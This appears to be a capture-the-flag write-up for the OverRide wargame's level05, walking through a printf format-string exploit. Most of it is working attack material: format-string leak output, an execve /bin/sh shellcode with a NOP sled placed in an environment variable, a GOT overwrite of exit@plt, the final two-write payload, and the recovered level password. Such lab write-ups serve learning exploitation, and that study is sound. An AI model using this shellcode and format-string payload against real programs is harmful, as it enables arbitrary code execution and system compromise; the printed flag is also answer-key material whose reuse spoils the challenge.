We notice a printf exploit

```
level05@OverRide:~$ ./level05
AAAA %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x
aaaa 64 f7fcfac0 f7ec3af9 ffffd6df ffffd6de 0 ffffffff ffffd764 f7fdb000 61616161 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078
```

We also notice there is a tolower() applied on every capital letter -> it implies we would not be able to put the shellcode derictly inside the buffer as some bytes will be modified.
It does not seems like there is existing executable code that would help us achieve our exploit.

Which means we will have to use a shellcode using env variables
We prefix it with a nopsled

```
export SHELLCODE=$(python -c 'print "\x90" * 100 + "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"')
```

Let's now get the shellcode's address

```
gdb ./level05
x/100s *environ
0xffffd866: "SHELLCODE=\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\061\311\367\341Qh//shh/bin\211\343\260\v̀"
```

On offset l'adresse de minimum 9 pour tomber sur le nopsled. (16 par precaution)
`0xffffd876` => `4294957174` en decimal

On va rediriger l'execution de la plt d'exit vers cette adresse:

```
0x8048513 <main+207>            call   0x8048370 <exit@plt>
disas 0x8048370
0x8048370 <exit@plt>                    jmp    *0x80497e0
```

We craft the payload:

```
(python -c 'print "\x08\x04\x83\x76"[::-1] + "%4294957c%10$n"' ; cat) | ./level05
```

As the padding is too large , we need to divide it into two 2 bytes write:

0xffff -> 65535
and 0xd876 -> 55414

we also need to remove 8 instead of 4 as there will be 2 adresses for the first one , then the size of what has been written to the second one
As FFFF > D876 we need to write first D876 then FFFF
55414 - 8 = 55406
65535 - 55414 = 10121

```
(python -c 'print "\x08\x04\x97\xe0"[::-1] + "\x08\x04\x97\xe2"[::-1] + "%55406c%10$n" + "%10121c%11$n"' ; cat) | ./level05
```

```
h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
```
